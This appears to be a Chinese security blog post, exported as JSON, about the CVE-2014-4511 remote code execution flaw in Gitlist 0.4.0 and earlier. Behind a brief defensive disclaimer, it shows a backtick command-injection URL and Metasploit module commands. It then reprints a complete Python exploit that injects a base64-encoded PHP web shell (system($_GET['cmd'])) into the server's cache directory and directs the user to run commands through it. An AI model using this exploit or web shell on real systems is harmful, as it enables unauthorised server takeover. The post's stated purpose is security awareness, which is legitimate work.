{"title":"Gitlist代码版本控制脆弱性","slug":"网安大类/Vulnerable/Appllication/版本控制/Gitlist代码版本控制脆弱性","date":"2019-07-17T05:36:30.000Z","updated":"2023-01-31T02:29:10.673Z","url":"2019/7-17-411.html","path":"api/articles/2019/7-17-411.html.json","covers":["https://img.weiyigeek.top/2019/20190717162323.png","https://img.weiyigeek.top/2019/20190717162509.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-Gitlist-Revision-Control-Tools-在存在远程代码执行漏洞\"><a href=\"#0x00-Gitlist-Revision-Control-Tools-在存在远程代码执行漏洞\" class=\"headerlink\" title=\"0x00 Gitlist (Revision Control Tools)在存在远程代码执行漏洞\"></a>0x00 Gitlist (Revision Control Tools)在存在远程代码执行漏洞</h4><p>背景：在gitlist 0.4.0及之前版本存在远程代码执行漏洞，漏洞CVE版本号为CVE-2014-4511，该漏洞利用方式为：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://test.com/test.git/master/<span class=\"string\">\"\"</span>`whoami`   <span class=\"comment\">#，通过执行该命令可以导致gitlist出现未知错误</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/20190717162323.png\" alt=\"WeiyiGeek.示例\" title=\"\" class=\"\">\n                <p>WeiyiGeek.示例</p>\n            </figure></p>\n<p>通过该利用程序可以将php木马写入到gitlist目录中，从而获取权限服务器：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf里面集成了gitlist_rce exploit：</span><br><span class=\"line\">msf exploit &gt; use gitlist_rce</span><br><span class=\"line\">msf exploit(gitlist_rce) &gt; rexploit</span><br></pre></td></tr></table></figure></p>\n<p>python版利用代码：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> commands <span class=\"keyword\">import</span> getoutput</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\" </span></span><br><span class=\"line\"><span class=\"string\">Exploit Title: Gitlist &lt;= 0.4.0 anonymous RCE</span></span><br><span class=\"line\"><span class=\"string\">Date: 06/20/2014</span></span><br><span class=\"line\"><span class=\"string\">Author: drone (@dronesec)</span></span><br><span class=\"line\"><span class=\"string\">Vendor Homepage: http://gitlist.org/</span></span><br><span class=\"line\"><span class=\"string\">Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz</span></span><br><span class=\"line\"><span class=\"string\">Version: &lt;= 0.4.0</span></span><br><span class=\"line\"><span class=\"string\">Tested on: Debian 7</span></span><br><span class=\"line\"><span class=\"string\">More information: </span></span><br><span class=\"line\"><span class=\"string\">cve: CVE-2014-4511</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> len(sys.argv) &lt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'%s: [url to git repo] &#123;cache path&#125;'</span> % sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'  Example: python %s http://localhost/gitlist/my_repo.git'</span> % sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache'</span> % sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">url = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">url = url <span class=\"keyword\">if</span> url[<span class=\"number\">-1</span>] != <span class=\"string\">'/'</span> <span class=\"keyword\">else</span> url[:<span class=\"number\">-1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">\"/var/www/gitlist/cache\"</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> len(sys.argv) &gt; <span class=\"number\">2</span>:</span><br><span class=\"line\">    path = sys.argv[<span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'[!] Using cache location %s'</span> % path</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># payload &lt;?system($_GET['cmd']);?&gt;</span></span><br><span class=\"line\">payload = <span class=\"string\">\"PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo=\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sploit; python requests does not like this URL, hence wget is used</span></span><br><span class=\"line\">mpath = <span class=\"string\">'/blame/master/\"\"`echo &#123;0&#125;|base64 -d &gt; &#123;1&#125;/x.php`'</span>.format(payload, path)</span><br><span class=\"line\">mpath = url+ urllib.quote(mpath)</span><br><span class=\"line\"></span><br><span class=\"line\">out = getoutput(<span class=\"string\">\"wget %s\"</span> % mpath)</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">'500'</span> <span class=\"keyword\">in</span> out:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'[!] Shell dropped; go hit %s/cache/x.php?cmd=ls'</span> % url.rsplit(<span class=\"string\">'/'</span>, <span class=\"number\">1</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'[-] Failed to drop'</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> out</span><br></pre></td></tr></table></figure></p>\n<p>执行效果:<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/20190717162509.png\" alt=\"WeiyiGeek.利用方式\" title=\"\" class=\"\">\n                <p>WeiyiGeek.利用方式</p>\n            </figure></p>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"漏洞分析","path":"api/categories/漏洞分析.json"}],"tags":[{"name":"Gitlist","path":"api/tags/Gitlist.json"}]}